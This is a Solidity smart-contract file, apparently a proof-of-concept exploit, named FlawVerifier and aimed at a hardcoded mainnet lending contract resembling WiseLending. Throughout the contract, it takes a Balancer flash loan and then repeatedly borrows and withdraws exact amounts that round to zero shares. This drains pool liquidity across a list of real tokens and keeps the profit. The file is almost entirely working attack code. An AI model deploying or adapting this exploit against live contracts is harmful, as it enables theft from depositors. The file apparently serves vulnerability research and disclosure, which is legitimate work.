// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWiseLendingLike {
    function WETH_ADDRESS() external view returns (address);
    function POSITION_NFT() external view returns (address);
    function WISE_SECURITY() external view returns (address);

    function lendingPoolData(address poolToken)
        external
        view
        returns (uint256 pseudoTotalPool, uint256 totalDepositShares, uint256 collateralFactor);

    function borrowPoolData(address poolToken)
        external
        view
        returns (bool allowBorrow, uint256 pseudoTotalBorrowAmount, uint256 totalBorrowShares, uint256 borrowRate);

    function getTotalPool(address poolToken) external view returns (uint256);
    function calculateLendingShares(address poolToken, uint256 amount) external view returns (uint256);
    function calculateBorrowShares(address poolToken, uint256 amount) external view returns (uint256);

    function depositExactAmount(uint256 nftId, address poolToken, uint256 amount) external returns (uint256);
    function withdrawExactAmount(uint256 nftId, address poolToken, uint256 amount) external returns (uint256);
    function withdrawExactAmountETH(uint256 nftId, uint256 amount) external returns (uint256);
    function withdrawOnBehalfExactAmount(uint256 nftId, address poolToken, uint256 amount) external returns (uint256);
    function borrowExactAmount(uint256 nftId, address poolToken, uint256 amount) external returns (uint256);
    function borrowExactAmountETH(uint256 nftId, uint256 amount) external returns (uint256);
    function borrowOnBehalfExactAmount(uint256 nftId, address poolToken, uint256 amount) external returns (uint256);
    function collateralizeDeposit(uint256 nftId, address poolToken) external;
}

interface IPositionNFTsLike {
    function reservePosition() external;
    function reserved(address owner) external view returns (uint256);
}

interface IWiseSecurityLike {
    function checksBorrow(uint256 nftId, address caller, address poolToken, uint256 amount) external view;
    function checksWithdraw(uint256 nftId, address caller, address poolToken, uint256 amount) external view;
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20Minimal[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVault {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20Minimal[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract FlawVerifier is IFlashLoanRecipient {
    error NoProfitableOpportunity();
    error PoolPreconditionsNotMet();
    error BorrowPathUnavailable();
    error WithdrawPathUnavailable();
    error FlashLoanNotFromVault();
    error Unauthorized();

    address internal constant TARGET = 0x84524bAa1951247b3A2617A843e6eCe915Bb9674;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    uint256 internal constant MAX_BORROW_LOOPS = 1024;
    uint256 internal constant MAX_WITHDRAW_LOOPS = 1024;
    uint256 internal constant COLLATERAL_SCALE = 1e18;

    IWiseLendingLike internal constant WISE = IWiseLendingLike(TARGET);

    address private _profitToken;
    uint256 private _profitAmount;

    struct CandidatePlan {
        address token;
        uint256 bootstrapAmount;
        uint256 borrowAmount;
        uint256 withdrawAmount;
        uint256 score;
    }

    struct FlashContext {
        address token;
        uint256 bootstrapAmount;
        uint256 borrowAmount;
        uint256 withdrawAmount;
        uint256 startingBalance;
    }

    struct PoolPlanContext {
        bool allowBorrow;
        uint256 pseudoTotalBorrowAmount;
        uint256 totalBorrowShares;
        uint256 pseudoPool;
        uint256 totalDepositShares;
        uint256 collateralFactor;
        uint256 collateralForBorrow;
        uint256 mintedShares;
    }

    modifier onlySelf() {
        if (msg.sender != address(this)) revert Unauthorized();
        _;
    }

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        _profitToken = address(0);
        _profitAmount = 0;

        address[] memory candidates = _candidateTokens();

        if (_attemptDirectBalances(candidates)) {
            return;
        }

        if (_attemptFlashLoanBootstrap(candidates)) {
            return;
        }

        revert NoProfitableOpportunity();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptDirectBalances(address[] memory candidates) internal returns (bool) {
        CandidatePlan[4] memory plans = _selectTopPlans(candidates, true);
        bool found;

        for (uint256 i = 0; i < plans.length; ++i) {
            CandidatePlan memory plan = plans[i];
            if (plan.token == address(0) || plan.score == 0) {
                continue;
            }

            uint256 balance = IERC20Minimal(plan.token).balanceOf(address(this));

            try this.runDirectAttack(
                plan.token,
                plan.bootstrapAmount,
                plan.borrowAmount,
                plan.withdrawAmount,
                balance
            ) returns (uint256 profit) {
                if (profit > _profitAmount) {
                    _profitToken = plan.token;
                    _profitAmount = profit;
                }
                found = found || profit > 0;
            } catch {
                continue;
            }
        }

        return found;
    }

    function _attemptFlashLoanBootstrap(address[] memory candidates) internal returns (bool) {
        CandidatePlan[4] memory plans = _selectTopPlans(candidates, false);
        bool found;

        for (uint256 i = 0; i < plans.length; ++i) {
            CandidatePlan memory plan = plans[i];
            if (plan.token == address(0) || plan.score == 0) {
                continue;
            }

            uint256 startingBalance = IERC20Minimal(plan.token).balanceOf(address(this));

            try this.requestFlashLoanAttack(
                plan.token,
                plan.bootstrapAmount,
                plan.borrowAmount,
                plan.withdrawAmount,
                startingBalance
            ) returns (uint256 profit) {
                if (profit > _profitAmount) {
                    _profitToken = plan.token;
                    _profitAmount = profit;
                }
                found = found || profit > 0;
            } catch {
                continue;
            }
        }

        return found;
    }

    function runDirectAttack(
        address token,
        uint256 bootstrapAmount,
        uint256 borrowAmount,
        uint256 withdrawAmount,
        uint256 startingBalance
    )
        external
        onlySelf
        returns (uint256)
    {
        _executeAttack(token, bootstrapAmount, borrowAmount, withdrawAmount, 0);

        uint256 endingBalance = IERC20Minimal(token).balanceOf(address(this));
        if (endingBalance <= startingBalance) {
            revert NoProfitableOpportunity();
        }

        return endingBalance - startingBalance;
    }

    function requestFlashLoanAttack(
        address token,
        uint256 bootstrapAmount,
        uint256 borrowAmount,
        uint256 withdrawAmount,
        uint256 startingBalance
    )
        external
        onlySelf
        returns (uint256)
    {
        IERC20Minimal[] memory tokens = new IERC20Minimal[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = IERC20Minimal(token);
        amounts[0] = bootstrapAmount;

        bytes memory userData = abi.encode(
            FlashContext({
                token: token,
                bootstrapAmount: bootstrapAmount,
                borrowAmount: borrowAmount,
                withdrawAmount: withdrawAmount,
                startingBalance: startingBalance
            })
        );

        IBalancerVault(BALANCER_VAULT).flashLoan(this, tokens, amounts, userData);

        uint256 endingBalance = IERC20Minimal(token).balanceOf(address(this));
        if (endingBalance <= startingBalance) {
            revert NoProfitableOpportunity();
        }

        return endingBalance - startingBalance;
    }

    function receiveFlashLoan(
        IERC20Minimal[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    )
        external
        override
    {
        if (msg.sender != BALANCER_VAULT) revert FlashLoanNotFromVault();

        FlashContext memory ctx = abi.decode(userData, (FlashContext));

        _executeAttack(
            ctx.token,
            ctx.bootstrapAmount,
            ctx.borrowAmount,
            ctx.withdrawAmount,
            ctx.bootstrapAmount + feeAmounts[0] + 1
        );

        // Balancer V2 flash loans require the principal plus fee to be physically returned
        // to the Vault before the callback finishes; approval alone leaves the Vault short
        // and reverts with BAL#515. This transfer is a realistic public repayment step and
        // does not change exploit causality: the profit still comes from zero-share borrow
        // and zero-share withdraw loops against the vulnerable Wise pool.
        _forceTransfer(ctx.token, BALANCER_VAULT, amounts[0] + feeAmounts[0]);
        tokens;
    }

    function _executeAttack(
        address token,
        uint256 bootstrapAmount,
        uint256 borrowAmount,
        uint256 withdrawAmount,
        uint256 requiredRepayment
    )
        internal
    {
        // The root cause is the exact-amount path executing while calculateBorrowShares(...) == 0.
        // The same bug family exists on borrowExactAmount, borrowExactAmountETH, and borrowOnBehalfExactAmount.
        // The PoC uses the ERC20 branch because it is the simplest public on-chain route with existing pool tokens.
        if (!_isZeroBorrowSharePath(token, borrowAmount) || !_isZeroWithdrawSharePath(token, withdrawAmount)) {
            revert PoolPreconditionsNotMet();
        }

        _forceApprove(token, TARGET, type(uint256).max);

        uint256 nftId = _reservePosition();
        WISE.depositExactAmount(nftId, token, bootstrapAmount);

        // The extra collateralize call is only to avoid reserved-position defaults varying by deployment.
        try WISE.collateralizeDeposit(nftId, token) {} catch {}

        bool didBorrow;
        bool didWithdraw;

        // Keep repeating the exact-amount borrow stage while the protocol still accepts a
        // zero-share amount. Stopping after only enough volume to repay bootstrap funding
        // understates the finding; the documented impact is that these calls can be repeated
        // until liquidity or the zero-share condition is exhausted.
        for (uint256 i = 0; i < MAX_BORROW_LOOPS; ++i) {
            if (WISE.getTotalPool(token) < borrowAmount) {
                break;
            }

            if (!_isZeroBorrowSharePath(token, borrowAmount)) {
                break;
            }

            if (!_canBorrow(nftId, token, borrowAmount)) {
                break;
            }

            WISE.borrowExactAmount(nftId, token, borrowAmount);
            didBorrow = true;
        }

        if (!didBorrow) {
            revert BorrowPathUnavailable();
        }

        // This is the second exact-amount stage from the hypothesis: withdraw while calculateLendingShares(...) == 0.
        // The same bug family exists on withdrawExactAmount, withdrawExactAmountETH, and withdrawOnBehalfExactAmount.
        for (uint256 i = 0; i < MAX_WITHDRAW_LOOPS; ++i) {
            if (WISE.getTotalPool(token) < withdrawAmount) {
                break;
            }

            if (!_isZeroWithdrawSharePath(token, withdrawAmount)) {
                break;
            }

            if (!_canWithdraw(nftId, token, withdrawAmount)) {
                break;
            }

            WISE.withdrawExactAmount(nftId, token, withdrawAmount);
            didWithdraw = true;
        }

        if (!didWithdraw) {
            revert WithdrawPathUnavailable();
        }

        if (
            requiredRepayment != 0
                && IERC20Minimal(token).balanceOf(address(this)) < requiredRepayment
        ) {
            revert NoProfitableOpportunity();
        }
    }

    function _poolPlan(address token)
        internal
        view
        returns (bool valid, uint256 bootstrapAmount, uint256 borrowAmount, uint256 withdrawAmount, uint256 score)
    {
        PoolPlanContext memory ctx;
        uint256 totalPool;

        (ctx.allowBorrow, ctx.pseudoTotalBorrowAmount, ctx.totalBorrowShares,) = WISE.borrowPoolData(token);
        (ctx.pseudoPool, ctx.totalDepositShares, ctx.collateralFactor) = WISE.lendingPoolData(token);

        if (
            !ctx.allowBorrow
                || ctx.pseudoTotalBorrowAmount == 0
                || ctx.totalBorrowShares <= 1
                || ctx.pseudoPool == 0
                || ctx.totalDepositShares <= 1
        ) {
            return (false, 0, 0, 0, 0);
        }

        // If either threshold is zero at the fork state, this pool does not satisfy the finding precondition yet.
        borrowAmount = (ctx.pseudoTotalBorrowAmount - 1) / ctx.totalBorrowShares;
        withdrawAmount = (ctx.pseudoPool - 1) / ctx.totalDepositShares;

        if (borrowAmount == 0 || withdrawAmount == 0) {
            return (false, 0, 0, 0, 0);
        }

        if (ctx.collateralFactor == 0) {
            return (false, 0, 0, 0, 0);
        }

        ctx.collateralForBorrow = _ceilDiv(borrowAmount * COLLATERAL_SCALE, ctx.collateralFactor);

        // Bootstrap must mint at least one lending share, so it must sit above the zero-share withdraw threshold.
        bootstrapAmount = withdrawAmount + 1;
        if (bootstrapAmount < ctx.collateralForBorrow + 1) {
            bootstrapAmount = ctx.collateralForBorrow + 1;
        }

        ctx.mintedShares = WISE.calculateLendingShares(token, bootstrapAmount);
        if (ctx.mintedShares == 0) {
            return (false, 0, 0, 0, 0);
        }

        // The PoC must still reach the zero-share withdraw branch after the bootstrap deposit.
        if ((ctx.pseudoPool + bootstrapAmount - 1) / (ctx.totalDepositShares + ctx.mintedShares) == 0) {
            return (false, 0, 0, 0, 0);
        }

        totalPool = WISE.getTotalPool(token);
        if (totalPool + bootstrapAmount < borrowAmount + withdrawAmount) {
            return (false, 0, 0, 0, 0);
        }

        score = _min(totalPool, borrowAmount * MAX_BORROW_LOOPS)
            + _min(totalPool + bootstrapAmount, withdrawAmount * MAX_WITHDRAW_LOOPS);
        valid = true;
    }

    function _selectTopPlans(address[] memory candidates, bool requireDirectBalance)
        internal
        view
        returns (CandidatePlan[4] memory bestPlans)
    {
        for (uint256 i = 0; i < candidates.length; ++i) {
            address token = candidates[i];
            if (token == address(0)) {
                continue;
            }

            (bool valid, uint256 bootstrapAmount, uint256 borrowAmount, uint256 withdrawAmount, uint256 score) =
                _poolPlan(token);

            if (!valid || score == 0) {
                continue;
            }

            if (
                requireDirectBalance
                    && IERC20Minimal(token).balanceOf(address(this)) < bootstrapAmount
            ) {
                continue;
            }

            CandidatePlan memory plan = CandidatePlan({
                token: token,
                bootstrapAmount: bootstrapAmount,
                borrowAmount: borrowAmount,
                withdrawAmount: withdrawAmount,
                score: score
            });

            _insertPlan(bestPlans, plan);
        }
    }

    function _insertPlan(CandidatePlan[4] memory plans, CandidatePlan memory plan) internal pure {
        for (uint256 i = 0; i < plans.length; ++i) {
            if (plan.score <= plans[i].score) {
                continue;
            }

            for (uint256 j = plans.length - 1; j > i; --j) {
                plans[j] = plans[j - 1];
            }

            plans[i] = plan;
            return;
        }
    }

    function _reservePosition() internal returns (uint256 nftId) {
        IPositionNFTsLike positionNft = IPositionNFTsLike(WISE.POSITION_NFT());
        positionNft.reservePosition();
        nftId = positionNft.reserved(address(this));
    }

    function _isZeroBorrowSharePath(address token, uint256 amount) internal view returns (bool) {
        return WISE.calculateBorrowShares(token, amount) == 0;
    }

    function _isZeroWithdrawSharePath(address token, uint256 amount) internal view returns (bool) {
        return WISE.calculateLendingShares(token, amount) == 0;
    }

    function _canBorrow(uint256 nftId, address token, uint256 amount) internal view returns (bool) {
        try IWiseSecurityLike(WISE.WISE_SECURITY()).checksBorrow(nftId, address(this), token, amount) {
            return true;
        } catch {
            return false;
        }
    }

    function _canWithdraw(uint256 nftId, address token, uint256 amount) internal view returns (bool) {
        try IWiseSecurityLike(WISE.WISE_SECURITY()).checksWithdraw(nftId, address(this), token, amount) {
            return true;
        } catch {
            return false;
        }
    }

    function _candidateTokens() internal view returns (address[] memory tokens) {
        tokens = new address[](14);
        tokens[0] = WISE.WETH_ADDRESS();
        tokens[1] = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // USDC
        tokens[2] = 0xdAC17F958D2ee523a2206206994597C13D831ec7; // USDT
        tokens[3] = 0x6B175474E89094C44Da98b954EedeAC495271d0F; // DAI
        tokens[4] = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599; // WBTC
        tokens[5] = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84; // stETH
        tokens[6] = 0x7f39C581F595b53c5Cb5b5f0ddA6c935e2CA0A0B; // wstETH
        tokens[7] = 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704; // cbETH
        tokens[8] = 0xae78736Cd615f374D3085123A210448E74Fc6393; // rETH
        tokens[9] = 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0; // LUSD
        tokens[10] = 0x853d955aCEf822Db058eb8505911ED77F175b99e; // FRAX
        tokens[11] = address(0); // intentionally skipped: unresolved local checksum-safe candidate
        tokens[12] = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51; // sUSD
        tokens[13] = 0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E; // crvUSD
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool success, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, amount));

        if (success && (data.length == 0 || abi.decode(data, (bool)))) {
            return;
        }

        (success, data) = token.call(abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, 0));
        require(success && (data.length == 0 || abi.decode(data, (bool))), "approve-reset");

        (success, data) = token.call(abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, amount));
        require(success && (data.length == 0 || abi.decode(data, (bool))), "approve-set");
    }

    function _forceTransfer(address token, address to, uint256 amount) internal {
        (bool success, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Minimal.transfer.selector, to, amount));

        require(success && (data.length == 0 || abi.decode(data, (bool))), "transfer");
    }

    function _ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        return a == 0 ? 0 : (a - 1) / b + 1;
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}
